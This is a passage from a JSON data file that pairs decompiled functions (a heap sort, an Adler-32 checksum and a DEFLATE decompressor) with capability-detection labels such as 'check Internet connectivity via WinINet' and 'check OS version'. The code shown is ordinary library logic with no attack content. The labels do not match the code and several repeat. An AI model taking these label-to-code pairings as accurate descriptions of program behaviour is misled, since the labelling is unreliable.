uVar28 - 2 >> 1;\n        while (-1 < *(puVar21 + 0x3c)) {\n            iVar11 = *(puVar21 + 0x3c);\n            while( true ) {\n                iVar17 = iVar11 * 2;\n                *(puVar21 + 0x48) = iVar17 + 1;\n                if (uVar28 <= iVar17 + 1) break;\n                uVar10 = 0;\n                if (iVar17 + 2 < uVar28) {\n                    iVar16 = **(puVar21 + 0x20) + *(*(*(puVar21 + 0x20) + 0x10) + puVar8[iVar17 + 1] * 4);\n                    puVar14 = iVar16 + 0x2e;\n                    iVar17 = **(puVar21 + 0x20) + *(*(*(puVar21 + 0x20) + 0x10) + puVar8[iVar17 + 2] * 4);\n                    *(puVar21 + 0x28) = *(iVar16 + 0x1c);\n                    uVar15 = *(iVar17 + 0x1c);\n                    *(puVar21 + 0x4c) = iVar17 + 0x2e;\n                    *(puVar21 + 0x30) = uVar15;\n                    uVar10 = *(puVar21 + 0x28);\n                    if (uVar15 < *(puVar21 + 0x28)) {\n                        uVar10 = uVar15;\n                    }\n                    *(puVar21 + 0x40) = puVar14 + uVar10;\n                    uVar18 = 0;\n                    for (; uVar27 = uVar18,  puVar14 <= *(puVar21 + 0x40) && *(puVar21 + 0x40) != puVar14;\n                        puVar14 = puVar14 + 1) {\n                        uVar18 = *puVar14;\n                        if (uVar18 + 0xbf < 0x1a) {\n                            uVar18 = uVar18 + 0x20;\n                        }\n                        uVar27 = **(puVar21 + 0x4c);\n                        if (uVar27 + 0xbf < 0x1a) {\n                            uVar27 = uVar27 + 0x20;\n                        }\n                        if (uVar18 != uVar27) break;\n                        *(puVar21 + 0x4c) = *(puVar21 + 0x4c) + 1;\n                    }\n                    if (*(puVar21 + 0x40) == puVar14) {\n                        bVar31 = *(puVar21 + 0x28) < *(puVar21 + 0x30);\n                    }\n                    else {\n                        bVar31 = uVar18 < uVar27;\n                    }\n                    uVar10 = bVar31;\n                }\n                *(puVar21 + 0x4c) = puVar8 + iVar11;\n                uVar9 = puVar8[iVar11];\n                *(puVar21 + 0x30) = uVar10 + *(puVar21 + 0x48);\n                *(puVar21 + 0x58) = uVar9;\n                uVar9 = puVar8[uVar10 + *(puVar21 + 0x48)];\n                *(puVar21 + 0x48) = puVar8 + uVar10 + *(puVar21 + 0x48);\n                iVar11 = (*(puVar21 + 0x20))[4];\n                *(puVar21 + 0x40) = uVar9;\n                iVar17 = **(puVar21 + 0x20);\n                iVar16 = *(iVar11 + *(puVar21 + 0x58) * 4) + iVar17;\n                iVar17 = iVar17 + *(iVar11 + *(puVar21 + 0x40) * 4);\n                puVar14 = iVar16 + 0x2e;\n                *(puVar21 + 0x28) = *(iVar16 + 0x1c);\n                uVar15 = *(iVar17 + 0x1c);\n                *(puVar21 + 0x5c) = iVar17 + 0x2e;\n                uVar10 = *(puVar21 + 0x28);\n                if (uVar15 < *(puVar21 + 0x28)) {\n                    uVar10 = uVar15;\n                }\n                *(puVar21 + 0x50) = puVar14 + uVar10;\n                uVar18 = 0;\n                for (; uVar27 = uVar18,  puVar14 <= *(puVar21 + 0x50) && *(puVar21 + 0x50) != puVar14;\n                    puVar14 = puVar14 + 1) {\n                    uVar18 = *puVar14;\n                    if (uVar18 + 0xbf < 0x1a) {\n                        uVar18 = uVar18 + 0x20;\n                    }\n                    uVar27 = **(puVar21 + 0x5c);\n                    if (uVar27 + 0xbf < 0x1a) {\n                        uVar27 = uVar27 + 0x20;\n                    }\n                    if (uVar18 != uVar27) break;\n                    *(puVar21 + 0x5c) = *(puVar21 + 0x5c) + 1;\n                }\n                if (*(puVar21 + 0x50) == puVar14) {\n                    bVar31 = *(puVar21 + 0x28) < uVar15;\n                }\n                else {\n                    bVar31 = uVar18 < uVar27;\n                }\n                if (!bVar31) break;\n                uVar9 = *(puVar21 + 0x58);\n                **(puVar21 + 0x4c) = *(puVar21 + 0x40);\n                **(puVar21 + 0x48) = uVar9;\n                iVar11 = *(puVar21 + 0x30);\n            }\n            *(puVar21 + 0x3c) = *(puVar21 + 0x3c) + -1;\n        }\ncode_r0x00416fbe:\n        uVar28 = uVar28 - 1;\n        if (0 < uVar28) {\n            uVar9 = puVar8[uVar28];\n            iVar11 = 0;\n            puVar8[uVar28] = *puVar8;\n            *puVar8 = uVar9;\n            while( true ) {\n                iVar17 = iVar11 * 2;\n                *(puVar21 + 0x3c) = iVar17 + 1;\n                if (uVar28 <= iVar17 + 1) break;\n                uVar10 = 0;\n                if (iVar17 + 2 < uVar28) {\n                    iVar16 = **(puVar21 + 0x20) + *(*(*(puVar21 + 0x20) + 0x10) + puVar8[iVar17 + 1] * 4);\n                    puVar14 = iVar16 + 0x2e;\n                    iVar17 = **(puVar21 + 0x20) + *(*(*(puVar21 + 0x20) + 0x10) + puVar8[iVar17 + 2] * 4);\n                    *(puVar21 + 0x28) = *(iVar16 + 0x1c);\n                    uVar15 = *(iVar17 + 0x1c);\n                    *(puVar21 + 0x40) = iVar17 + 0x2e;\n                    *(puVar21 + 0x30) = uVar15;\n                    uVar10 = *(puVar21 + 0x28);\n                    if (uVar15 < *(puVar21 + 0x28)) {\n                        uVar10 = uVar15;\n                    }\n                    *(puVar21 + 0x48) = puVar14 + uVar10;\n                    uVar18 = 0;\n                    for (; uVar27 = uVar18,  puVar14 <= *(puVar21 + 0x48) && *(puVar21 + 0x48) != puVar14;\n                        puVar14 = puVar14 + 1) {\n                        uVar18 = *puVar14;\n                        if (uVar18 + 0xbf < 0x1a) {\n                            uVar18 = uVar18 + 0x20;\n                        }\n                        uVar27 = **(puVar21 + 0x40);\n                        if (uVar27 + 0xbf < 0x1a) {\n                            uVar27 = uVar27 + 0x20;\n                        }\n                        if (uVar18 != uVar27) break;\n                        *(puVar21 + 0x40) = *(puVar21 + 0x40) + 1;\n                    }\n                    if (*(puVar21 + 0x48) == puVar14) {\n                        bVar31 = *(puVar21 + 0x28) < *(puVar21 + 0x30);\n                    }\n                    else {\n                        bVar31 = uVar18 < uVar27;\n                    }\n                    uVar10 = bVar31;\n                }\n                *(puVar21 + 0x40) = puVar8 + iVar11;\n                uVar9 = puVar8[iVar11];\n                *(puVar21 + 0x30) = uVar10 + *(puVar21 + 0x3c);\n                *(puVar21 + 0x4c) = uVar9;\n                uVar9 = puVar8[uVar10 + *(puVar21 + 0x3c)];\n                *(puVar21 + 0x3c) = puVar8 + uVar10 + *(puVar21 + 0x3c);\n                iVar11 = **(puVar21 + 0x20);\n                *(puVar21 + 0x48) = uVar9;\n                iVar17 = (*(puVar21 + 0x20))[4];\n                iVar16 = *(iVar17 + *(puVar21 + 0x4c) * 4) + iVar11;\n                iVar11 = iVar11 + *(iVar17 + *(puVar21 + 0x48) * 4);\n                puVar14 = iVar16 + 0x2e;\n                *(puVar21 + 0x28) = *(iVar16 + 0x1c);\n                uVar15 = *(iVar11 + 0x1c);\n                *(puVar21 + 0x50) = iVar11 + 0x2e;\n                uVar10 = *(puVar21 + 0x28);\n                if (uVar15 < *(puVar21 + 0x28)) {\n                    uVar10 = uVar15;\n                }\n                *(puVar21 + 0x58) = puVar14 + uVar10;\n                uVar18 = 0;\n                for (; uVar27 = uVar18,  puVar14 <= *(puVar21 + 0x58) && *(puVar21 + 0x58) != puVar14;\n                    puVar14 = puVar14 + 1) {\n                    uVar18 = *puVar14;\n                    if (uVar18 + 0xbf < 0x1a) {\n                        uVar18 = uVar18 + 0x20;\n                    }\n                    uVar27 = **(puVar21 + 0x50);\n                    if (uVar27 + 0xbf < 0x1a) {\n                        uVar27 = uVar27 + 0x20;\n                    }\n                    if (uVar18 != uVar27) break;\n                    *(puVar21 + 0x50) = *(puVar21 + 0x50) + 1;\n                }\n                if (*(puVar21 + 0x58) == puVar14) {\n                    bVar31 = *(puVar21 + 0x28) < uVar15;\n                }\n                else {\n                    bVar31 = uVar18 < uVar27;\n                }\n                if (!bVar31) break;\n                uVar9 = *(puVar21 + 0x4c);\n                **(puVar21 + 0x40) = *(puVar21 + 0x48);\n                **(puVar21 + 0x3c) = uVar9;\n                iVar11 = *(puVar21 + 0x30);\n            }\n            goto code_r0x00416fbe;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 8069
    },
    "00417106": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00417106(uint32_t param_1, uint8_t *param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint8_t *puVar9;\n    uint8_t *puVar10;\n    \n    uVar7 = param_1 & 0xffff;\n    param_1 = param_1 >> 0x10;\n    puVar9 = param_3 % 0x15b0;\n    iVar1 = 1;\n    if (param_2 != NULL) {\n        while (param_3 != 0) {\n            for (puVar10 = param_2 + 7; puVar10 + -param_2 < puVar9; puVar10 = puVar10 + 8) {\n                iVar8 = uVar7 + puVar10[-7];\n                iVar1 = puVar10[-6] + iVar8;\n                iVar2 = iVar1 + puVar10[-5];\n                iVar3 = iVar2 + puVar10[-4];\n                iVar4 = iVar3 + puVar10[-3];\n                iVar5 = iVar4 + puVar10[-2];\n                iVar6 = iVar5 + puVar10[-1];\n                uVar7 = *puVar10 + iVar6;\n                param_1 = param_1 + iVar8 + iVar1 + iVar2 + iVar3 + iVar4 + iVar5 + iVar6 + uVar7;\n            }\n            param_2 = param_2 + (puVar9 & 0x1ff8);\n            iVar1 = (puVar9 & 0x1ff8) - param_2;\n            for (; param_2 + iVar1 < puVar9; param_2 = param_2 + 1) {\n                uVar7 = uVar7 + *param_2;\n                param_1 = param_1 + uVar7;\n            }\n            uVar7 = uVar7 % 0xfff1;\n            param_1 = param_1 % 0xfff1;\n            param_3 = param_3 - puVar9;\n            puVar9 = 0x15b0;\n        }\n        iVar1 = param_1 * 0x10000 + uVar7;\n    }\n    return iVar1;\n}\n",
        "token_count": 539
    },
    "004173d3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.004173d3(uint *param_1, uint16_t *param_2, int32_t *param_3, uint *param_4, uint *param_5, \n                     uint32_t *param_6, uint32_t param_7)\n\n{\n    uint16_t uVar1;\n    uchar uVar2;\n    uint16_t *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint *puVar8;\n    uint8_t *puVar9;\n    uint8_t uVar10;\n    uint32_t uVar11;\n    uint *puVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    uint32_t uVar19;\n    int32_t iVar20;\n    uint16_t *puVar21;\n    uint16_t *puVar22;\n    uint32_t uVar23;\n    uint *puVar24;\n    uint32_t uVar25;\n    uchar *puVar26;\n    int32_t *piVar27;\n    uint32_t uVar28;\n    uint8_t *puVar29;\n    bool bVar30;\n    uint *puStack244;\n    uint32_t uStack240;\n    uint32_t uStack232;\n    uint32_t uStack228;\n    uint32_t uStack224;\n    uint32_t uStack216;\n    int32_t iStack212;\n    int32_t iStack208;\n    uint8_t *puStack204;\n    uint32_t uStack164;\n    int32_t aiStack148 [16];\n    uint32_t auStack84 [17];\n    \n    puStack204 = 0xffffffff;\n    puVar3 = param_2 + *param_3;\n    puVar24 = param_5 + *param_6;\n    uVar25 = param_7 & 4;\n    if (uVar25 == 0) {\n        puStack204 = param_5 + ((*param_6 - 1) - param_4);\n    }\n    if (((puStack204 & puStack204 + 1) != 0) || (param_5 < param_4)) {\n        *param_6 = 0;\n        *param_3 = 0;\n        return 0xfffffffd;\n    }\n    uVar19 = param_1[1];\n    uStack240 = param_1[0xe];\n    uStack228 = param_1[8];\n    uVar28 = param_1[9];\n    uStack232 = param_1[10];\n    uStack224 = param_1[0xf];\n    puVar22 = param_2;\n    puVar21 = param_2;\n    // switch table (54 cases) at 0x424754\n    switch(*param_1) {\n    case 0:\n        param_1[3] = 0;\n        param_1[2] = 0;\n        param_1[7] = 1;\n        param_1[4] = 1;\n        if ((param_7 & 1) == 0) {\n            uVar28 = 0;\n            uStack240 = 0;\n            uStack232 = 0;\n            uVar19 = 0;\n            uStack228 = 0;\n            puStack244 = param_5;\n            goto code_r0x00417730;\n        }\n        if (param_2 < puVar3) {\n            uVar19 = 0;\n            uStack240 = 0;\n            uStack232 = 0;\n            uStack228 = 0;\n            param_1[2] = *param_2;\n            uVar28 = 0;\n            goto code_r0x004175dc;\n        }\n        uStack240 = 0;\n        uStack232 = 0;\n        uVar28 = 0;\n        uStack228 = 0;\n        uVar19 = 0;\ncode_r0x00417532:\n        if ((param_7 & 2) == 0) {\n            param_1[2] = 0;\n            if (param_2 < puVar3) goto code_r0x0041764c;\n            goto code_r0x0041763c;\n        }\n        *param_1 = 1;\n        puStack244 = param_5;\ncode_r0x00417619:\n        uVar25 = 1;\n        goto code_r0x00418ced;\n    case 1:\n        if (puVar3 <= param_2) goto code_r0x00417532;\n        param_1[2] = *param_2;\ncode_r0x004175dc:\n        puVar22 = param_2 + 1;\n        if (puVar22 < puVar3) {\ncode_r0x0041764c:\n            puVar21 = puVar22 + 1;\n            param_1[3] = *puVar22;\n        }\n        else {\ncode_r0x004175f8:\n            puVar21 = puVar22;\n            if ((param_7 & 2) != 0) {\n                *param_1 = 2;\n                puStack244 = param_5;\n                goto code_r0x00417619;\n            }\ncode_r0x0041763c:\n            param_1[3] = 0;\n        }\n        goto code_r0x0041765b;\n    case 2:\n        if (puVar3 <= param_2) goto code_r0x004175f8;\n        puVar21 = param_2 + 1;\n        param_1[3] = *param_2;\ncode_r0x0041765b:\n        uVar23 = param_1[2];\n        uVar28 = 1;\n        if (((uVar23 * 0x100 + param_1[3]) % 0x1f == 0) && ((param_1[3] & 0x20) == 0)) {\n            uVar28 = (uVar23 & 0xf) != 8;\n        }\n        if (uVar25 == 0) {\n            uVar4 = 1;\n            uVar10 = (uVar23 >> 4) + 8;\n            if (1 << (uVar10 & 0x1f) < 0x8001) {\n                uVar4 = puStack204 + 1 >> (uVar10 & 0x1f) == 0;\n            }\n            uVar28 = uVar4 | uVar28;\n        }\n        if (uVar28 == 0) {\n            puStack244 = param_5;\n            do {\n                for (; uVar19 < 3; uVar19 = uVar19 + 8) {\ncode_r0x00417730:\n                    if (puVar21 < puVar3) {\n                        uVar23 = *puVar21;\n                        puVar21 = puVar21 + 1;\n                    }\n                    else {\ncode_r0x00417756:\n                        if ((param_7 & 2) != 0) {\n                            *param_1 = 3;\n                            goto code_r0x00417619;\n                        }\n                        uVar23 = 0;\n                    }\ncode_r0x00417794:\n                    uStack240 = uStack240 | uVar23 << (uVar19 & 0x1f);\n                }\n                uVar19 = uVar19 - 3;\n                uVar23 = uStack240 >> 3;\n                param_1[5] = uStack240 & 7;\n                uVar4 = (uStack240 & 7) >> 1;\n                param_1[6] = uVar4;\n                uStack240 = uVar23;\n                if (uVar4 == 0) {\n                    bVar30 = uVar19 < (uVar19 & 7);\n                    while (bVar30) {\n                        if (puVar21 < puVar3) {\n                            uVar23 = *puVar21;\n                            puVar21 = puVar21 + 1;\n                        }\n                        else {\ncode_r0x00417801:\n                            if ((param_7 & 2) != 0) {\n                                *param_1 = 5;\n                                goto code_r0x00417619;\n                            }\n                            uVar23 = 0;\n                        }\ncode_r0x0041783f:\n                        uStack240 = uStack240 | uVar23 << (uVar19 & 0x1f);\n                        uVar19 = uVar19 + 8;\n                        bVar30 = uVar19 < (uVar19 & 7);\n                    }\n                    uVar28 = 0;\n                    uStack240 = uStack240 >> (uVar19 & 7);\n                    uVar19 = uVar19 & 0xfffffff8;\n                    do {\n                        if (uVar19 == 0) {\n                            if (puVar21 < puVar3) {\n                                uVar10 = *puVar21;\n                                puVar21 = puVar21 + 1;\n                                *(param_1 + uVar28 + 0x2920) = uVar10;\n                            }\n                            else {\ncode_r0x00417934:\n                                if ((param_7 & 2) != 0) {\n                                    *param_1 = 7;\n                                    goto code_r0x00417619;\n                                }\n                                *(param_1 + uVar28 + 0x2920) = 0;\n                            }\n                        }\n                        else {\n                            for (; uVar19 < 8; uVar19 = uVar19 + 8) {\n                                if (puVar21 < puVar3) {\n                                    uVar23 = *puVar21;\n                                    puVar21 = puVar21 + 1;\n                                }\n                                else {\ncode_r0x0041789c:\n                                    if ((param_7 & 2) != 0) {\n                                        *param_1 = 6;\n                                        goto code_r0x00417619;\n                                    }\n                                    uVar23 = 0;\n                                }\ncode_r0x004178da:\n                                uStack240 = uStack240 | uVar23 << (uVar19 & 0x1f);\n                            }\n                            uStack240 = uStack240 >> 8;\n                            *(param_1 + uVar28 + 0x2920) = uStack240;\n                            uVar19 = uVar19 - 8;\n                        }\ncode_r0x00417992:\n                        uVar28 = uVar28 + 1;\n                    } while (uVar28 < 4);\n                    uVar28 = *(param_1 + 0xa48);\n                    if (uVar28 != ~*(param_1 + 0x2922)) goto code_r0x004179d0;\n                    while ((uVar28 != 0 && (uVar19 != 0))) {\n                        for (; uVar19 < 8; uVar19 = uVar19 + 8) {\n                            if (puVar21 < puVar3) {\n                                uVar23 = *puVar21;\n                                puVar21 = puVar21 + 1;\n                            }\n                            else {\ncode_r0x00417a00:\n                                if ((param_7 & 2) != 0) {\n                                    *param_1 = 0x33;\n                                    goto code_r0x00417619;\n                                }\n                                uVar23 = 0;\n                            }\ncode_r0x00417a37:\n                            uStack240 = uStack240 | uVar23 << (uVar19 & 0x1f);\n                        }\n                        uStack228 = uStack240 & 0xff;\n                        uStack240 = uStack240 >> 8;\n                        uVar19 = uVar19 - 8;\ncode_r0x00417a80:\n                        if (puVar24 <= puStack244) {\n                            *param_1 = 0x34;\n                            goto code_r0x00418a1d;\n                        }\n                        uVar28 = uVar28 - 1;\n                        *puStack244 = uStack228;\n                        puStack244 = puStack244 + 1;\n                    }\n                    for (; uVar28 != 0; uVar28 = uVar28 - uVar4) {\ncode_r0x00417ad0:\n                        if (puVar24 <= puStack244) {\n                            *param_1 = 9;\ncode_r0x00418a1d:\n                            uVar25 = 2;\n                            goto code_r0x00418ced;\n                        }\ncode_r0x00417b1f:\n                        if (puVar3 <= puVar21) {\n                            if ((param_7 & 2) == 0) goto code_r0x00417afc;\n                            *param_1 = 0x26;\n                            goto code_r0x00417619;\n                        }\n                        uVar23 = puVar3 - puVar21;\n                        if (puVar24 - puStack244 < puVar3 - puVar21) {\n                            uVar23 = puVar24 - puStack244;\n                        }\n                        uVar4 = uVar23;\n                        if (uVar28 < uVar23) {\n                            uVar23 = uVar28;\n                            uVar4 = uVar28;\n                        }\n                        for (; uVar23 != 0; uVar23 = uVar23 - 1) {\n                            *puStack244 = *puVar21;\n                            puVar21 = puVar21 + 1;\n                            puStack244 = puStack244 + 1;\n                        }\n                    }\n                }\n                else {\n                    if (uVar4 == 3) goto code_r0x00417b8f;\n                    if (uVar4 == 1) {\n                        param_1[0xb] = 0x120;\n                        param_1[0xc] = 0x20;\n                        puVar6 = param_1 + 0x378;\n                        for (iVar13 = 0x20; iVar13 != 0; iVar13 = iVar13 + -1) {\n                            *puVar6 = 5;\n                            puVar6 = puVar6 + 1;\n                        }\n                        iVar13 = 0;\n                        do {\n                            *(param_1 + iVar13 + 0x40) = 8;\n                            iVar13 = iVar13 + 1;\n                        } while (iVar13 != 0x90);\n                        do {\n                            *(param_1 + iVar13 + 0x40) = 9;\n                            iVar13 = iVar13 + 1;\n                        } while (iVar13 != 0x100);\n                        do {\n                            *(param_1 + iVar13 + 0x40) = 7;\n                            iVar13 = iVar13 + 1;\n                        } while (iVar13 != 0x118);\n                        do {\n                            *(param_1 + iVar13 + 0x40) = 8;\n                            iVar13 = iVar13 + 1;\n                        } while (iVar13 != 0x120);\n                    }\n                    else {\n                        uVar28 = 0;\n                        do {\n                            if (uVar19 < *(uVar28 + 0x42474b)) {\n                                do {\n                                    if (puVar21 < puVar3) {\n                                        uVar23 = *puVar21;\n                                        puVar21 = puVar21 + 1;\n                                    }\n                                    else {\ncode_r0x00417c47:\n                                        if ((param_7 & 2) != 0) {\n                                            *param_1 = 0xb;\n                                            goto code_r0x00417619;\n                                        }\n                                        uVar23 = 0;\n                                    }\ncode_r0x00417c85:\n                                    uStack240 = uStack240 | uVar23 << (uVar19 & 0x1f);\n                                    uVar19 = uVar19 + 8;\n                                } while (uVar19 < *(uVar28 + 0x42474b));\n                            }\n                            uVar10 = *(uVar28 + 0x42474b);\n                            uVar19 = uVar19 - uVar10;\n                            uVar23 = (1 << (uVar10 & 0x1f)) - 1U & uStack240;\n                            uStack240 = uStack240 >> (uVar10 & 0x1f);\n                            param_1[uVar28 + 0xb] = uVar23 + *(uVar28 * 4 + 0x424cb0);\n                            uVar28 = uVar28 + 1;\n                        } while (uVar28 < 3);\n                        uVar28 = 0;\n                        puVar6 = param_1 + 0x6e0;\n                        for (iVar13 = 0x48; iVar13 != 0; iVar13 = iVar13 + -1) {\n                            *puVar6 = 0;\n                            puVar6 = puVar6 + 1;\n                        }\n                        for (; uVar28 < param_1[0xd]; uVar28 = uVar28 + 1) {\n                            for (; uVar19 < 3; uVar19 = uVar19 + 8) {\n                                if (puVar21 < puVar3) {\n                                    uVar23 = *puVar21;\n                                    puVar21 = puVar21 + 1;\n                                }\n                                else {\ncode_r0x00417d10:\n                                    if ((param_7 & 2) != 0) {\n                                        *param_1 = 0xe;\n                                        goto code_r0x00417619;\n                                    }\n                                    uVar23 = 0;\n                                }\ncode_r0x00417d47:\n                                uStack240 = uStack240 | uVar23 << (uVar19 & 0x1f);\n                            }\n                            uVar19 = uVar19 - 3;\n                            *(param_1 + *(uVar28 + 0x424c9c) + 0x1b80) = uStack240 & 7;\n                            uStack240 = uStack240 >> 3;\n                        }\n                        param_1[0xd] = 0x13;\n                    }\n                    while (iVar13 = param_1[6],  -1 < iVar13) {\n                        iVar15 = iVar13 * 0xda0;\n                        piVar27 = aiStack148;\n                        for (iVar14 = 0x10; iVar14 != 0; iVar14 = iVar14 + -1) {\n                            *piVar27 = 0;\n                            piVar27 = piVar27 + 1;\n                        }\n                        puVar6 = param_1 + iVar13 * 0x368 + 0x58;\n                        for (iVar14 = 0x200; iVar14 != 0; iVar14 = iVar14 + -1) {\n                            *puVar6 = 0;\n                            puVar6 = puVar6 + 1;\n                        }\n                        puVar6 = param_1 + iVar13 * 0x368 + 600;\n                        for (iVar14 = 0x120; iVar14 != 0; iVar14 = iVar14 + -1) {\n                            *puVar6 = 0;\n                            puVar6 = puVar6 + 1;\n                        }\n                        iVar14 = param_1[6];\n                        iVar16 = param_1[iVar14 + 0xb];\n                        for (iVar17 = 0; iVar17 != iVar16; iVar17 = iVar17 + 1) {\n                            aiStack148[*(param_1 + iVar17 + iVar15 + 0x40)] =\n                                 aiStack148[*(param_1 + iVar17 + iVar15 + 0x40)] + 1;\n                        }\n                        auStack84[1] = 0;\n                        auStack84[0] = 0;\n                        uVar23 = 0;\n                        uVar4 = 0;\n                        iVar17 = 1;\n                        do {\n                            piVar27 = aiStack148 + iVar17;\n                            iVar17 = iVar17 + 1;\n                            uVar4 = uVar4 + *piVar27;\n                            uVar23 = (uVar23 + *piVar27) * 2;\n                            auStack84[iVar17] = uVar23;\n                        } while (iVar17 != 0x10);\n                        if ((uVar23 != 0x10000) && (1 < uVar4)) goto code_r0x00417dbe;\n                        iVar13 = iVar13 * 0x6d0;\n                        iStack212 = -1;\n                        for (iStack208 = 0; iStack208 != iVar16; iStack208 = iStack208 + 1) {\n                            uVar10 = *(param_1 + iStack208 + iVar15 + 0x40);\n                            uVar23 = uVar10;\n                            if (uVar23 != 0) {\n                                uVar4 = auStack84[uVar23];\n                                uStack216 = 0;\n                                auStack84[uVar23] = uVar4 + 1;\n                                uStack164 = uVar23;\n                                do {\n                                    uVar11 = uVar4 & 1;\n                                    uVar5 = uStack216 * 2;\n                                    uStack216 = uVar5 | uVar11;\n                                    uStack164 = uStack164 - 1;\n                                    uVar4 = uVar4 >> 1;\n                                } while (uStack164 != 0);\n                                if (uVar23 < 0xb) {\n                                    while (uStack216 < 0x400) {\n                                        *(param_1 + uStack216 * 2 + iVar15 + 0x160) = uVar10 << 9 | iStack208;\n                                        uStack216 = uStack216 + (1 << (uVar10 & 0x1f));\n                                    }\n                                }\n                                else {\n                                    iVar18 = (uVar5 & 0x3ff | uVar11) + iVar13;\n                                    iVar17 = *(param_1 + iVar18 * 2 + 0x160);\n                                    if (iVar17 == 0) {\n                                        *(param_1 + iVar18 * 2 + 0x160) = iStack212;\n                                        iVar17 = iStack212;\n                                        iStack212 = iStack212 + -2;\n                                    }\n                                    uVar5 = uVar5 >> 9;\n                                    for (; uVar5 = uVar5 >> 1,  uVar23 != 0xb; uVar23 = uVar23 - 1) {\n                                        iVar18 = iVar13 + ~(iVar17 - (uVar5 & 1));\n                                        iVar17 = *(param_1 + iVar18 * 2 + 0x960);\n                                        if (*(param_1 + iVar18 * 2 + 0x960) == 0) {\n                                            *(param_1 + iVar18 * 2 + 0x960) = iStack212;\n                                            iVar17 = iStack212;\n                                            iStack212 = iStack212 + -2;\n                                        }\n                                    }\n                                    *(param_1 + (((uVar5 & 1) - iVar17) + 0x4af + iVar13) * 2) = iStack208;\n                                }\n                            }\n                        }\n                        if (iVar14 == 2) {\n                            uVar28 = 0;\n                            while( true ) {\n                                iVar13 = param_1[0xb];\n                                iVar14 = param_1[0xc];\n                                if (iVar13 + iVar14 <= uVar28) break;\n                                puVar22 = puVar21;\n                                if (uVar19 < 0xf) {\n                                    if (puVar3 - puVar21 < 2) {\n                                        do {\n                                            uVar23 = *(param_1 + (uStack240 & 0x3ff) * 2 + 0x1ca0);\n                                            if (uVar23 < 0) {\n                                                if (10 < uVar19) {\n                                                    iVar13 = 10;\n                                                    do {\n                                                        uVar23 = *(param_1 +\n                                                                  ((uStack240 >> (iVar13 & 0x1f) & 1) + 0x1250 + ~uVar23\n                                                                  ) * 2);\n                                                        if (-1 < uVar23) goto code_r0x00417f2d;\n                                                        uVar4 = iVar13 + 2;\n                                                        iVar13 = iVar13 + 1;\n                                                    } while (uVar4 <= uVar19);\n                                                }\n                                            }\n                                            else if ((uVar23 >> 9 != 0) && (uVar23 >> 9 <= uVar19)) break;\n                                            if (puVar22 < puVar3) {\n                                                uVar23 = *puVar22;\n                                                puVar22 = puVar22 + 1;\n                                            }\n                                            else {\ncode_r0x00417dee:\n                                                if ((param_7 & 2) != 0) {\n                                                    *param_1 = 0x10;\n                                                    puVar21 = puVar22;\n                                                    goto code_r0x00417619;\n                                                }\n                                                uVar23 = 0;\n                                            }\ncode_r0x00417e25:\n                                            uStack240 = uStack240 | uVar23 << (uVar19 & 0x1f);\n                                            uVar19 = uVar19 + 8;\n                                        } while (uVar19 < 0xf);\n                                    }\n                                    else {\n                                        puVar22 = puVar21 + 1;\n                                        uStack240 = uStack240 |\n                                                    *puVar21 << (uVar19 & 0x1f) | *(puVar21 + 1) << (uVar19 + 8 & 0x1f);\n                                        uVar19 = uVar19 + 0x10;\n                                    }\n                                }\ncode_r0x00417f2d:\n                                uStack228 = *(param_1 + (uStack240 & 0x3ff) * 2 + 0x1ca0);\n                                if (uStack228 < 0) {\n                                    iVar13 = 10;\n                                    do {\n                                        iVar14 = iVar13 + 1;\n                                        uStack228 = *(param_1 +\n                                                     ((uStack240 >> (iVar13 & 0x1f) & 1) + 0x1250 + ~uStack228) * 2);\n                                        iVar13 = iVar14;\n                                    } while (uStack228 < 0);\n                                }\n                                else {\n                                    iVar14 = uStack228 >> 9;\n                                    uStack228 = uStack228 & 0x1ff;\n                                }\n                                uStack240 = uStack240 >> (iVar14 & 0x1f);\n                                uVar19 = uVar19 - iVar14;\n                                puVar21 = puVar22;\n                                if (uStack228 < 0x10) {\n                                    *(param_1 + uVar28 + 0x2924) = uStack228;\n                                    uVar28 = uVar28 + 1;\n                                }\n                                else {\n                                    if ((uStack228 == 0x10) && (uVar28 == 0)) {\n                                        uStack228 = 0x10;\n                                        goto code_r0x00417f83;\n                                    }\n                                    uStack232 = *(uStack228 + 0x424683);\n                                    if (uVar19 < uStack232) {\n                                        do {\n                                            if (puVar22 < puVar3) {\n                                                uVar23 = *puVar22;\n                                                puVar22 = puVar22 + 1;\n                                            }\n                                            else {\ncode_r0x00417fcc:\n                                                if ((param_7 & 2) != 0) {\n                                                    *param_1 = 0x12;\n                                                    puVar21 = puVar22;\n                                                    goto code_r0x00417619;\n                                                }\n                                                uVar23 = 0;\n                                            }\ncode_r0x0041800a:\n                                            uStack240 = uStack240 | uVar23 << (uVar19 & 0x1f);\n                                            uVar19 = uVar19 + 8;\n                                            puVar21 = puVar22;\n                                        } while (uVar19 < uStack232);\n                                    }\n                                    uVar23 = (1 << (uStack232 & 0x1f)) - 1U & uStack240;\n                                    uStack240 = uStack240 >> (uStack232 & 0x1f);\n                                    uVar19 = uVar19 - uStack232;\n                         